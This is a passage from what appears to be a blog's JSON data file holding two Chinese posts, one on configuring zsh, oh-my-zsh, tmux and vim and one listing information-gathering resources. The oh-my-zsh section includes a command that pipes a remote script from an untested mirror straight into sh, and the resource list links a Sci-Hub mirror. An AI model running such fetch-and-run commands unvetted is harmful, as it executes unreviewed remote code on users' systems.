对于colors部分，背景改成灰/黑色，不透明度调到20%-30%，不影响terminal内文字的观看，同时能够看到后面的背景就行。</p>\n<h2 id=\"zsh配置方案\">zsh配置方案</h2>\n<p>因为后面一些配置，在有了zsh后方便一些，所以先配置zsh</p>\n<h4 id=\"安装\">安装</h4>\n<ul>\n<li>\n<p>安装zsh</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install zsh</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>替换为默认shell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>\n<ul>\n<li>tips: 这个命令需要重启shell(or 系统，我记不清了，先关了再开终端试一下，没有生效再重启系统吧)才能生效，所以不要像我一样以为这个命令失效了，反复发呆</li>\n</ul>\n</li>\n<li>\n<p>安装oh-my-zsh<br>\noh-my-zsh是github上的一个开源项目，可以便捷进行zsh的插件、主题管理<br>\nYou can find <a href=\"https://github.com/ohmyzsh/ohmyzsh\">official document</a> here</p>\n<ul>\n<li>\n<p>官方文件提供的安装方案如下<br>\n使用curl连接。<br>\n如果你没有配置代理或者改hosts的话，你大概率是安装不了的，可以使用一下国内镜像:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sh -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n<p>需要先安装curl。由于我本人没有尝试过这个镜像，我本人是通过改hosts安装的，raw.fithubsercontent.con好像还没有完全屏蔽，改hosts仍然可行，如果安装失败的话，可以私我</p>\n</li>\n</ul>\n</li>\n<li>\n<p>改配置文件<br>\n这个阶段，可以把文件管理器改为显示隐藏文件<br>\n如果你上一步安装完成，在主文件夹(也就是桌面软件的home目录，一般用~表示)会出现一个.zshrc的文件，这是zsh的配置文件，要用sudo vim写入，安装oh-my-zsh后</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim ~/.zshrc</span><br></pre></td></tr></table></figure>\n<p>打开后应该有大量注释后文本，帮助你修改配置文本</p>\n</li>\n</ul>\n<p>​\t\t我就把ZSH_THEME改成了ys，如果有需要，可以加一些插件，改一些style，因为oh-my-zsh\t\t自带了相当多插件，怎么引入可以查看官方文档</p>\n<p>​\t\t可以使用alias命令为命令添加别名，方便使用<br>\n​</p>\n<ul>\n<li>\n<p>使配置文件生效</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>\n<p>zsh命令行使用此命令，使配置文件生效</p>\n</li>\n</ul>\n<h4 id=\"使用\">使用</h4>\n<p>zsh自带了许多非常好用的功能，自动补全，智能高亮，这里我就不教怎么使用了，可以参考<br>\n<a href=\"https://www.zhihu.com/question/21418449\">为什么说 zsh 是 shell 中的极品？ - 知乎 (zhihu.com)</a></p>\n<h2 id=\"tmux\">tmux</h2>\n<p>tmux是一个终端复用软件，多用于用于分屏，在shell 键入tmux就进入了tmux，具体使用快捷键和命令请百度，此处不教怎么使用<br>\n一个tips是tmux中的ctrl+b是一个进入命令模式的键，类似于vim的esc，所以很多快捷键写的ctrl+B+xx，意思是先按下ctrl+b，再按其他键</p>\n<h4 id=\"配置\">配置</h4>\n<p>依旧在主文件目录下新建一个 .tmux.conf配置文件</p>\n<p>具体配置可以参考: <a href=\"https://github.com/YashdalfTheGray/dotfiles/blob/master/macos/.tmux.conf\">https://github.com/YashdalfTheGray/dotfiles/blob/master/macos/.tmux.conf</a></p>\n<p>最后这一部分就是加入插件的，自动帮你完成了插件安装</p>\n<p>复制这个配置就行，然后在shell进入tmux<br>\n键入:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tmux source-file ~/.tmux.conf</span><br></pre></td></tr></table></figure>\n<h2 id=\"vim\">vim</h2>\n<p>如果说其他插件只是影响美观的，vim不装插件真的是跟装插件是两种软件，</p>\n<p>首先确认你安装了较新版本的vim</p>\n<h4 id=\"插件安装\">插件安装</h4>\n<p>安装<a href=\"https://github.com/junegunn/vim-plug#installation\">vim-plug</a></p>\n<p>本人亲测官网安装命令路径不咋好用，一个是不挂代理连不上，一个式官网linux的安装路径无效，我们来手动安装。</p>\n<ul>\n<li>首先复制官网的plug.vim文件</li>\n<li>（如果没有）在本地主文件夹新建一个.vim文件夹，里面兴建一个autoload文件夹，将plug.vim放入</li>\n<li>再在.vim中新建一个plug目录</li>\n</ul>\n<h4 id=\"配置-2\">配置</h4>\n<p>主文件夹新建.vimrc文件</p>\n<p>配置文件参考https://github.com/YashdalfTheGray/dotfiles/blob/master/macos/.vimrc</p>\n<p>将此处改为~/.vim/plug</p>\n<p>打开vim，按esc命令进入命令模式, 输入:  ，再用source命令导入.vimrc</p>\n<p>再在命令模式输入:PlugInstall，插件安装完成，reload，整体配置成功，具体使用网上资料很多，不再赘述</p>\n"},{"title":"信息素养[1]-信息获取","date":"2022-02-19T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n\n\n\n# 信息获取\n\n//持续更新完善ing\n\n这是我关于信息素养的第一篇文章。在我看来，在当今社会最重要的能力就是获取、处理、管理以及\n分析和总结信息并在此基础上形成输出的能力，而我也将按这个顺序组织出我个人的信息管理体系。\n\n\n\n本系列主要思路来源：罗昭峰《文献管理与信息分析》\n\n\n\n在这个流程中，最开始也是最基础的部分就是信息获取\n\n```mermaid\ngraph LR\n\t信息获取---主动获取\n    信息获取---被动获取\n    主动获取---专业知识\n    主动获取---杂\n```\n\n## 主动获取\n\n### 专业知识\n\n#### [一]安全领域\n\n#### 1.书籍\n\n书籍是快速了解一个领域最好的方法。我个人观点，国内大部分课程信息密度太低，所以我个人偏爱看书的方式学习\n\n- [鸠摩搜索](https://www.jiumodiary.com/)\n  电子书相关\n\n#### 2.一些网站\n\n- [GitHub](https://github.com/)\n  著名代码托管平台\n\n#### 3.一些论坛/新闻\n\n- 微信公众号：看雪学院\n  会有一些漏洞的演示\n\n#### 4.前沿\n\n- 安全领域四大顶会\n  - [Technical Sessions | USENIX](https://www.usenix.org/conference/usenixsecurity14/technical-sessions)\n  - [IEEE Symposium on Security and Privacy and Euro S&P (ieee-security.org)](http://www.ieee-security.org/TC/SP-Index.html)\n  - [NDSS Symposium – The Network and Distributed System Security Symposium (NDSS) (ndss-symposium.org)](https://www.ndss-symposium.org/)\n  - [ACM CCS (sigsac.org)](http://www.sigsac.org/ccs.html)\n- 论文\n  - [Sci-hubs](https://sci-hub.hkvisa.net/)\n  - 图书馆官网\n- 各类数据库\n\n#### 5.官方文档\n\n- Zeal\n  快速查阅各种官方文档\n\n#### [二]其他\n\n- [心晴网](http://www.ixinqing.com/)\n  心理学电子书\n- [Index—The Stacks project (columbia.edu)](https://stacks.math.columbia.edu/)\n  数学领域的开源尝试\n\n### 杂\n\n杂项主要指零碎知识的获取，包括遇到的各种问题等\n\n#### 1. 搜索引擎的使用\n\n**个人使用习惯：**中文搜索：bing国内版；英文搜索：Google\n\n//这些点来源文章忘记了\n\n- **Use the tabs**\n- **Use quotes：**\n  ** 引号将之识别为整体，如**“Puppy Dog Sweaters”**，搜索Puppy Dog Sweaters，反之分开搜索\n- **Use a hyphen to exclude words：\n   Mustang**-**cars** : search for mustangs but to remove any results that have the word “car” in it\n- **Use a colon to search specific sites:\n   **Sidney Crosby site:nhl.com** : This will search for all content about famous hockey player Sidney Crosby, but only on NHL.com\n- **Find a page that links to another page：\n   **link:www.whu.edu.cn\n- **Use the asterisk wildcard\n   “Come \\* right now \\* me**” :  Google search will search for that phrase knowing that the asterisks can be any word\n- **Find sites that are similar to other sites：\n   **related:amazon.com\n- **Use Google search to do math**\n   **8 \\* 5 + 5**\n- **Search for multiple words at once** **chocolate OR white chocolate**\n- **Search a range of numbers** **What teams have won the Stanley Cup ..2004 **:\n  the search will toss back the team that won the Stanley Cup in 2004. The two dots with only one number will tell the search that you don’t need anything before or after 2004 **41..43**   :    Google will search for the numbers 41, 42, and 43\n\n- **Find a specific file** \\* search term here \\* **filetype:pdf**\n\n- **Keep it simple**\n\n- **Gradually add search terms**\n\n- **Use words that websites would use**\n\n- **Use words that websites would use**\n\n- **Use important words only**\n\n- **Google search has shortcuts** **Weather \\*zip code\\***   \n  This will show you the weather in the given zip code. You can also use town and city names instead of area codes, but it may not be as accurate if there are multiple area codes in the city. **What is \\*celebrity name\\* Bacon Number**   This is a fun little one that will tell you how many connections any given celebrity has to famed actor Kevin Bacon. The popular joke, Six Degrees of Kevin Bacon, is that no actor is more than 6 connections away from Kevin Bacon. Mark Zuckerberg has a Bacon Number of 3. **What is the definition of \\*word\\* or Define: \\*word\\***    This will display the definition of a word. **Time \\*place***    This will display the time in whatever place you type in. You can check any stock by **typing its ticker name** into Google. If you search for GOOG, it will check the stock prices for Google.\n\n- **Spelling doesn’t necessarily matter**\n\n- **Use descriptive words**\n\n- **Find a specific file**\n  \\*search term here\\* filetype:pdf\n\n- **Money and unit conversions** \n  miles to km – This will convert miles to kilometers. You can put numbers in front to convert a certain number. Like “10 miles to km” will show you how many kilometers are in 10 miles. USD to British Pound Sterling – This will convert a US dollar to British pounds. Like the measurements above, you can add numbers to find exact conversions for a certain amount of money.\n\n- **Track your packages**\n\n#### 2.本地搜索软件\n\n- Everything\n\n#### 3.各类网站\n\n- [StackOverflow](https://stackoverflow.com/)\n  编程相关问答社区，编程相关问题回答质量高、解决概率大，提问需要遵守相关规范\n- [Stanford Encyclopedia of Philosophy](https://plato.stanford.edu/)\n  斯坦福大学的一个哲学名词解释库\n\n- [Quora](https://www.quora.com/)\n  综合类问答社区，宽泛性问题可以一观\n- [知乎](https://www.zhihu.com/hot)\n  综合类问答社区，趣味性问题可以一观\n- [WiKi](https://wuu.wikipedia.org/)\n  著名百科类网站\n\n- [WikiHow](https://zh.wikihow.com/)\n  没有什么用但是很有趣的生活小妙招\n\n## 被动获取\n\n主动获取的局限性是你不可能获取你不知道的知识，所以被动获取就很有必要了\n\n#### 1. RSS\n\n本人使用gReader\n整合了各类新闻和相关论坛","source":"_posts/信息素养[1]-信息获取.md","raw":"---\ntitle: 信息素养[1]-信息获取\ndate: 2022-2-20\ntags: \n- 信息素养\n\ncategories:\n- 杂项\n\ntoc: true # 是否启用内容索引\nsidebar: none # 是否启用sidebar侧边栏，none：不启用\n---\n\n\n\n\n\n# 信息获取\n\n//持续更新完善ing\n\n这是我关于信息素养的第一篇文章。在我看来，在当今社会最重要的能力就是获取、处理、管理以及\n分析和总结信息并在此基础上形成输出的能力，而我也将按这个顺序组织出我个人的信息管理体系。\n\n\n\n本系列主要思路来源：罗昭峰《文献管理与信息分析》\n\n\n\n在这个流程中，最开始也是最基础的部分就是信息获取\n\n```mermaid\ngraph LR\n\t信息获取---主动获取\n    信息获取---被动获取\n    主动获取---专业知识\n    主动获取---杂\n```\n\n## 主动获取\n\n### 专业知识\n\n#### [一]安全领域\n\n#### 1.书籍\n\n书籍是快速了解一个领域最好的方法。我个人观点，国内大部分课程信息密度太低，所以我个人偏爱看书的方式学习\n\n- [鸠摩搜索](https://www.jiumodiary.com/)\n  电子书相关\n\n#### 2.一些网站\n\n- [GitHub](https://github.com/)\n  著名代码托管平台\n\n#### 3.一些论坛/新闻\n\n- 微信公众号：看雪学院\n  会有一些漏洞的演示\n\n#### 4.前沿\n\n- 安全领域四大顶会\n  - [Technical Sessions | USENIX](https://www.usenix.org/conference/usenixsecurity14/technical-sessions)\n  - [IEEE Symposium on Security and Privacy and Euro S&P (ieee-security.org)](http://www.ieee-security.org/TC/SP-Index.html)\n  - [NDSS Symposium – The Network and Distributed System Security Symposium (NDSS) (ndss-symposium.org)](https://www.ndss-symposium.org/)\n  - [ACM CCS (sigsac.org)](http://www.sigsac.org/ccs.html)\n- 论文\n  - [Sci-hubs](https://sci-hub.hkvisa.net/)\n  - 图书馆官网\n- 各类数据库\n\n#### 5.官方文档\n\n- Zeal\n  快速查阅各种官方文档\n\n#### [二]其他\n\n- [心晴网](http://www.ixinqing.com/)\n  心理学电子书\n- [Index—The Stacks project (columbia.edu)](https://stacks.math.columbia.edu/)\n  数学领域的开源尝试\n\n### 杂\n\n杂项主要指零碎知识的获取，包括遇到的各种问题等\n\n#### 1. 搜索引擎的使用\n\n**个人使用习惯：**中文搜索：bing国内版；英文搜索：Google\n\n//这些点来源文章忘记了\n\n- **Use the tabs**\n- **Use quotes：**\n  ** 引号将之识别为整体，如**“Puppy Dog Sweaters”**，搜索Puppy Dog Sweaters，反之分开搜索\n- **Use a hyphen to exclude words：\n   Mustang**-**cars** : search for mustangs but to remove any results that have the word “car” in it\n- **Use a colon to search specific sites:\n   **Sidney Crosby site:nhl.com** : This will search for all content about famous hockey player Sidney Crosby, but only on NHL.com\n- **Find a page that links to another page：\n   **link:www.whu.edu.cn\n- **Use the asterisk wildcard\n   “Come \\* right now \\* me**” :  Google search will search for that phrase knowing that the asterisks can be any word\n- **Find sites that are similar to other sites：\n   **related:amazon.com\n- **Use Google search to do math**\n   **8 \\* 5 + 5**\n- **Search for multiple words at once** **chocolate OR white chocolate**\n- **Search a range of numbers** **What teams have won the Stanley Cup ..2004 **:\n  the search will toss back the team that won the Stanley Cup in 2004. The two dots with only one number will tell the search that you don’t need anything before or after 2004 **41..43**   :    Google will search for the numbers 41, 42, and 43\n\n- **Find a specific file** \\* search term here \\* **filetype:pdf**\n\n- **Keep it simple**\n\n- **Gradually add search terms**\n\n- **Use words that websites would use**\n\n- **Use words that websites would use**\n\n- **Use important words only**\n\n- **Google search has shortcuts** **Weather \\*zip code\\***   \n  This will show you the weather in the given zip code. You can also use town and city names instead of area codes, but it may not be as accurate if there are multiple area codes in the city. **What is \\*celebrity name\\* Bacon Number**   This is a fun little one that will tell you how many connections any given celebrity has to famed actor Kevin Bacon. The popular joke, Six Degrees of Kevin Bacon, is that no actor is more than 6 connections away from Kevin Bacon. Mark Zuckerberg has a Bacon Number of 3. **What is the definition of \\*word\\* or Define: \\*word\\***    This will display the definition of a word. **Time \\*place***    This will display the time in whatever place you type in. You can check any stock by **typing its ticker name** into Google. If you search for GOOG, it will check the stock prices for Google.\n\n- **Spelling doesn’t necessarily matter**\n\n- **Use descriptive words**\n\n- **Find a specific file**\n  \\*search term here\\* filetype:pdf\n\n- **Money and unit conversions** \n  miles to km – This will convert miles to kilometers. You can put numbers in front to convert a certain number. Like “10 miles to km” will show you how many kilometers are in 10 miles. USD to British Pound Sterling – This will convert a US dollar to British pounds. Like the measurements above, you can add numbers to find exact conversions for a certain amount of money.\n\n- **Track your packages**\n\n#### 2.本地搜索软件\n\n- Everything\n\n#### 3.各类网站\n\n- [StackOverflow](https://stackoverflow.com/)\n  编程相关问答社区，编程相关问题回答质量高、解决概率大，提问需要遵守相关规范\n- [Stanford Encyclopedia of Philosophy](https://plato.stanford.edu/)\n  斯坦福大学的一个哲学名词解释库\n\n- [Quora](https://www.quora.com/)\n  综合类问答社区，宽泛性问题可以一观\n- [知乎](https://www.zhihu.com/hot)\n  综合类问答社区，趣味性问题可以一观\n- [WiKi](https://wuu.wikipedia.org/)\n  著名百科类网站\n\n- [WikiHow](https://zh.wikihow.com/)\n  没有什么用但是很有趣的生活小妙招\n\n## 被动获取\n\n主动获取的局限性是你不可能获取你不知道的知识，所以被动获取就很有必要了\n\n#### 1. RSS\n\n本人使用gReader\n整合了各类新闻和相关论坛","slug":"信息素养[1]-信息获取","published":1,"updated":"2022-06-29T15:48:15.518Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl6g6majh000nj8v0hyr784hl","content":"<h1 id=\"信息获取\">信息获取</h1>\n<p>//持续更新完善ing</p>\n<p>这是我关于信息素养的第一篇文章。在我看来，在当今社会最重要的能力就是获取、处理、管理以及<br>\n分析和总结信息并在此基础上形成输出的能力，而我也将按这个顺序组织出我个人的信息管理体系。</p>\n<p>本系列主要思路来源：罗昭峰《文献管理与信息分析》</p>\n<p>在这个流程中，最开始也是最基础的部分就是信息获取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">\t信息获取---主动获取</span><br><span class=\"line\">    信息获取---被动获取</span><br><span class=\"line\">    主动获取---专业知识</span><br><span class=\"line\">    主动获取---杂</span><br></pre></td></tr></table></figure>\n<h2 id=\"主动获取\">主动获取</h2>\n<h3 id=\"专业知识\">专业知识</h3>\n<h4 id=\"一-安全领域\">[一]安全领域</h4>\n<h4 id=\"1-书籍\">1.书籍</h4>\n<p>书籍是快速了解一个领域最好的方法。我个人观点，国内大部分课程信息密度太低，所以我个人偏爱看书的方式学习</p>\n<ul>\n<li><a href=\"https://www.jiumodiary.com/\">鸠摩搜索</a><br>\n电子书相关</li>\n</ul>\n<h4 id=\"2-一些网站\">2.一些网站</h4>\n<ul>\n<li><a href=\"https://github.com/\">GitHub</a><br>\n著名代码托管平台</li>\n</ul>\n<h4 id=\"3-一些论坛-新闻\">3.一些论坛/新闻</h4>\n<ul>\n<li>微信公众号：看雪学院<br>\n会有一些漏洞的演示</li>\n</ul>\n<h4 id=\"4-前沿\">4.前沿</h4>\n<ul>\n<li>安全领域四大顶会\n<ul>\n<li><a href=\"https://www.usenix.org/conference/usenixsecurity14/technical-sessions\">Technical Sessions | USENIX</a></li>\n<li><a href=\"http://www.ieee-security.org/TC/SP-Index.html\">IEEE Symposium on Security and Privacy and Euro S&amp;P (ieee-security.org)</a></li>\n<li><a href=\"https://www.ndss-symposium.org/\">NDSS Symposium – The Network and Distributed System Security Symposium (NDSS) (ndss-symposium.org)</a></li>\n<li><a href=\"http://www.sigsac.org/ccs.html\">ACM CCS (sigsac.org)</a></li>\n</ul>\n</li>\n<li>论文\n<ul>\n<li><a href=\"https://sci-hub.hkvisa.net/\">Sci-hubs</a></li>\n<li>图书馆官网</li>\n</ul>\n</li>\n<li>各类数据库</li>\n</ul>\n<h4 id=\"5-官方文档\">5.官方文档</h4>\n<ul>\n<li>Zeal<br>\n快速查阅各种官方文档</li>\n</ul>\n<h4 id=\"二-其他\">[二]其他</h4>\n<ul>\n<li><a href=\"http://www.ixinqing.com/\">心晴网</a><br>\n心理学电子书</li>\n<li><a href=\"https://stacks.math.columbia.edu/\">Index—The Stacks project (columbia.edu)</a><br>\n数学领域的开源尝试</li>\n</ul>\n<h3 id=\"杂\">杂</h3>\n<p>杂项主要指零碎知识的获取，包括遇到的各种问题等</p>\n<h4 id=\"1-搜索引擎的使用\">1. 搜索引擎的使用</h4>\n<p>**个人使用习惯：**中文搜索：bing国内版；英文搜索：Google</p>\n<p>//这些点来源文章忘记了</p>\n<ul>\n<li>\n<p><strong>Use the tabs</strong></p>\n</li>\n<li>\n<p><strong>Use quotes：</strong><br>\n** 引号将之识别为整体，如**“Puppy Dog Sweaters”**，搜索Puppy Dog Sweaters，反之分开搜索</p>\n</li>\n<li>\n<p><strong>Use a hyphen to exclude words：<br>\nMustang</strong>-<strong>cars</strong> : search for mustangs but to remove any results that have the word “car” in it</p>\n</li>\n<li>\n<p>**Use a colon to search specific sites:<br>\n<strong>Sidney Crosby site:nhl.com</strong> : This will search for all content about famous hockey player Sidney Crosby, but only on <a href=\"http://NHL.com\">NHL.com</a></p>\n</li>\n<li>\n<p>**Find a page that links to another page：<br>\n**link:www.whu.edu.cn</p>\n</li>\n<li>\n<p><strong>Use the asterisk wildcard<br>\n“Come * right now * me</strong>” :  Google search will search for that phrase knowing that the asterisks can be any word</p>\n</li>\n<li>\n<p>**Find sites that are similar to other sites：<br>\n**related:amazon.com</p>\n</li>\n<li>\n<p><strong>Use Google search to do math</strong><br>\n<strong>8 * 5 + 5</strong></p>\n</li>\n<li>\n<p><strong>Search for multiple words at once</strong> <strong>chocolate OR white chocolate</strong></p>\n</li>\n<li>\n<p><strong>Search a range of numbers</strong> **What teams have won the Stanley Cup …2004 **:<br>\nthe search will toss back the team that won the Stanley Cup in 2004. The two dots with only one number will tell the search that you don’t need anything before or after 2004 <strong>41…43</strong>   :    Google will search for the numbers 41, 42, and 43</p>\n</li>\n<li>\n<p><strong>Find a specific file</strong> * search term here * <strong>filetype:pdf</strong></p>\n</li>\n<li>\n<p><strong>Keep it simple</strong></p>\n</li>\n<li>\n<p><strong>Gradually add search terms</strong></p>\n</li>\n<li>\n<p><strong>Use words that websites would use</strong></p>\n</li>\n<li>\n<p><strong>Use words that websites would use</strong></p>\n</li>\n<li>\n<p><strong>Use important words only</strong></p>\n</li>\n<li>\n<p><strong>Google search has shortcuts</strong> <strong>Weather *zip code*</strong><br>\nThis will show you the weather in the given zip code. You can also use town and city names instead of area codes, but it may not be as accurate if there are multiple area codes in the city. <strong>What is *celebrity name* Bacon Number</strong>   This is a fun little one that will tell you how many connections any given celebrity has to famed actor Kevin Bacon. The popular joke, Six Degrees of Kevin Bacon, is that no actor is more than 6 connections away from Kevin Bacon. Mark Zuckerberg has a Bacon Number of 3. <strong>What is the definition of *word* or Define: *word*</strong>    This will display the definition of a word. <strong>Time *place</strong>*    This will display the time in whatever place you type in. You can check any stock by <strong>typing its ticker name</strong> into Google. If you search for GOOG, it will check the stock prices for Google.</p>\n</li>\n<li>\n<p><strong>Spelling doesn’t necessarily matter</strong></p>\n</li>\n<li>\n<p><strong>Use descriptive words</strong></p>\n</li>\n<li>\n<p><strong>Find a specific file</strong><br>\n*search term here* filetype:pdf</p>\n</li>\n<li>\n<p><strong>Money and unit conversions</strong><br>\nmiles to km – This will convert miles to kilometers. You can put numbers in front to convert a certain number. Like “10 miles to km” will show you how many kilometers are in 10 miles. USD to British Pound Sterling – This will convert a US dollar to British pounds. Like the measurements above, you can add numbers to find exact conversions for a certain amount of money.</p>\n</li>\n<li>\n<p><strong>Track your packages</strong></p>\n</li>\n</ul>\n<h4 id=\"2-本地搜索软件\">2.本地搜索软件</h4>\n<ul>\n<li>Everything</li>\n</ul>\n<h4 id=\"3-各类网站\">3.各类网站</h4>\n<ul>\n<li>\n<p><a href=\"https://stackoverflow.com/\">StackOverflow</a><br>\n编程相关问答社区，编程相关问题回答质量高、解决概率大，提问需要遵守相关规范</p>\n</li>\n<li>\n<p><a href=\"https://plato.stanford.edu/\">Stanford Encyclopedia of Philosophy</a><br>\n斯坦福大学的一个哲学名词解释库</p>\n</li>\n<li>\n<p><a href=\"https://www.quora.com/\">Quora</a><br>\n综合类问答社区，宽泛性问题可以一观</p>\n</li>\n<li>\n<p><a href=\"https://www.zhihu.com/hot\">知乎</a><br>\n综合类问答社区，趣味性问题可以一观</p>\n</li>\n<li>\n<p><a href=\"https://wuu.wikipedia.org/\">WiKi</a><br>\n著名百科类网站</p>\n</li>\n<li>\n<p><a href=\"https://zh.wikihow.com/\">WikiHow</a><br>\n没有什么用但是很有趣的生活小妙招</p>\n</li>\n</ul>\n<h2 id=\"被动获取\">被动获取</h2>\n<p>主动获取的局限性是你不可能获取你不知道的知识，所以被动获取就很有必要了</p>\n<h4 id=\"1-RSS\">1. RSS</h4>\n<p>本人使用gReader<br>\n整合了各类新闻和相关论坛</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"信息获取\">信息获取</h1>\n<p>//持续更新完善ing</p>\n<p>这是我关于信息素养的第一篇文章。在我看来，在当今社会最重要的能力就是获取、处理、管理以及<br>\n分析和总结信息并在此基础上形成输出的能力，而我也将按这个顺序组织出我个人的信息管理体系。</p>\n<p>本系列主要思路来源：罗昭峰《文献管理与信息分析》</p>\n<p>在这个流程中，最开始也是最基础的部分就是信息获取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">\t信息获取---主动获取</span><br><span class=\"line\">    信息获取---被动获取</span><br><span class=\"line\">    主动获取---专业知识</span><br><span class=\"line\">    主动获取---杂</span><br></pre></td></tr></table></figure>\n<h2 id=\"主动获取\">主动获取</h2>\n<h3 id=\"专业知识\">专业知识</h3>\n<h4 id=\"一-安全领域\">[一]安全领域</h4>\n<h4 id=\"1-书籍\">1.书籍</h4>\n<p>书籍是快速了解一个领域最好的方法。我个人观点，国内大部分课程信息密度太低，所以我个人偏爱看书的方式学习</p>\n<ul>\n<li><a href=\"https://www.jiumodiary.com/\">鸠摩搜索</a><br>\n电子书相关</li>\n</ul>\n<h4 id=\"2-一些网站\">2.一些网站</h4>\n<ul>\n<li><a href=\"https://github.com/\">GitHub</a><br>\n著名代码托管平台</li>\n</ul>\n<h4 id=\"3-一些论坛-新闻\">3.一些论坛/新闻</h4>\n<ul>\n<li>微信公众号：看雪学院<br>\n会有一些漏洞的演示</li>\n</ul>\n<h4 id=\"4-前沿\">4.前沿</h4>\n<ul>\n<li>安全领域四大顶会\n<ul>\n<li><a href=\"https://www.usenix.org/conference/usenixsecurity14/technical-sessions\">Technical Sessions | USENIX</a></li>\n<li><a href=\"http://www.ieee-security.org/TC/SP-Index.html\">IEEE Symposium on Security and Privacy and Euro S&amp;P (ieee-security.org)</a></li>\n<li><a href=\"https://www.ndss-symposium.org/\">NDSS Symposium – The Network and Distributed System Security Symposium (NDSS) (ndss-symposium.org)</a></li>\n<li><a href=\"http://www.sigsac.org/ccs.html\">ACM CCS (sigsac.org)</a></li>\n</ul>\n</li>\n<li>论文\n<ul>\n<li><a href=\"https://sci-hub.hkvisa.net/\">Sci-hubs</a></li>\n<li>图书馆官网</li>\n</ul>\n</li>\n<li>各类数据库</li>\n</ul>\n<h4 id=\"5-官方文档\">5.官方文档</h4>\n<ul>\n<li>Zeal<br>\n快速查阅各种官方文档</li>\n</ul>\n<h4 id=\"二-其他\">[二]其他</h4>\n<ul>\n<li><a href=\"http://www.ixinqing.com/\">心晴网</a><br>\n心理学电子书</li>\n<li><a href=\"https://stacks.math.columbia.edu/\">Index—The Stacks project (columbia.edu)</a><br>\n数学领域的开源尝试</li>\n</ul>\n<h3 id=\"杂\">杂</h3>\n<p>杂项主要指零碎知识的获取，包括遇到的各种问题等</p>\n<h4 id=\"1-搜索引擎的使用\">1. 搜索引擎的使用</h4>\n<p>**个人使用习惯：**中文搜索：bing国内版；英文搜索：Google</p>\n<p>//这些点来源文章忘记了</p>\n<ul>\n<li>\n<p><strong>Use the tabs</strong></p>\n</li>\n<li>\n<p><strong>Use quotes：</strong><br>\n** 引号将之识别为整体，如**“Puppy Dog Sweaters”**，搜索Puppy Dog Sweaters，反之分开搜索</p>\n</li>\n<li>\n<p><strong>Use a hyphen to exclude words：<br>\nMustang</strong>-<strong>cars</strong> : search for mustangs but to remove any results that have the word “car” in it</p>\n</li>\n<li>\n<p>**Use a colon to search specific sites:<br>\n<strong>Sidney Crosby site:nhl.com</strong> : This will search for all content about famous hockey player Sidney Crosby, but only on <a href=\"http://NHL.com\">NHL.com</a></p>\n</li>\n<li>\n<p>**Find a page that links to another page：<br>\n**link:www.whu.edu.cn</p>\n</li>\n<li>\n<p><strong>Use the asterisk wildcard<br>\n“Come * right now * me</strong>” :  Google search will search for that phrase knowing that the asterisks can be any word</p>\n</li>\n<li>\n<p>**Find sites that are similar to other sites：<br>\n**related:amazon.com</p>\n</li>\n<li>\n<p><strong>Use Google search to do math</strong><br>\n<strong>8 * 5 + 5</strong></p>\n</li>\n<li>\n<p><strong>Search for multiple words at once</strong> <strong>chocolate OR white chocolate</strong></p>\n</li>\n<li>\n<p><strong>Search a range of numbers</strong> **What teams have won the Stanley Cup …2004 **:<br>\nthe search will toss back the team that won the Stanley Cup in 2004. The two dots with only one number will tell the search that you don’t need anything before or after 2004 <strong>41…43</strong>   :    Google will search for the numbers 41, 42, and 43</p>\n</li>\n<li>\n<p><strong>Find a specific file</strong> * search term here * <strong>filetype:pdf</strong></p>\n</li>\n<li>\n<p><strong>Keep it simple</strong></p>\n</li>\n<li>\n<p><strong>Gradually add search terms</strong></p>\n</li>\n<li>\n<p><strong>Use words that websites would use</strong></p>\n</li>\n<li>\n<p><strong>Use words that websites would use</strong></p>\n</li>\n<li>\n<p><strong>Use important words only</strong></p>\n</li>\n<li>\n<p><strong>Google search has shortcuts</strong> <strong>Weather *zip code*</strong><br>\nThis will show you the weather in the given zip code. You can also use town and city names instead of area codes, but it may not be as accurate if there are multiple area codes in the city. <strong>What is *celebrity name* Bacon Number</strong>   This is a fun little one that will tell you how many connections any given celebrity has to famed actor Kevin Bacon. The popular joke, Six Degrees of Kevin Bacon, is that no actor is more than 6 connections away from Kevin Bacon. Mark Zuckerberg has a Bacon Number of 3. <strong>What is the definition of *word* or Define: *word*</strong>    This will display the definition of a word. <strong>Time *place</strong>*    This will display the time in whatever place you type in. You can check any stock by <strong>typing its ticker name</strong> into Google. If you search for GOOG, it will check the stock prices for Google.</p>\n</li>\n<li>\n<p><strong>Spelling doesn’t necessarily matter</strong></p>\n</li>\n<li>\n<p><strong>Use descriptive words</strong></p>\n</li>\n<li>\n<p><strong>Find a specific 